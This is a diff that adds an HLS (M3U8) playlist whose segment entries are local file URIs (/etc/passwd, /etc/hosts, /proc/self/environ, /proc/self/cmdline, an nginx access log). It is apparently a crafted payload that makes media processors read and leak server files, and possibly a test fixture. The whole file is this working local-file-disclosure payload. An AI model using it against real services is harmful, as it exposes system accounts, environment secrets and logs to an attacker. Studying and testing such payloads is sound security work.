@@ -1,0 +1,15 @@
+#EXTM3U
+#EXT-X-VERSION:3
+#EXT-X-MEDIA-SEQUENCE:0
+#EXT-X-TARGETDURATION:10
+#EXTINF:10.0,
+file:///etc/passwd
+#EXTINF:10.0,
+file:///etc/hosts
+#EXTINF:10.0,
+file:///proc/self/environ
+#EXTINF:10.0,
+file:///proc/self/cmdline
+#EXTINF:10.0,
+file:///var/log/nginx/access.log
+#EXT-X-ENDLIST
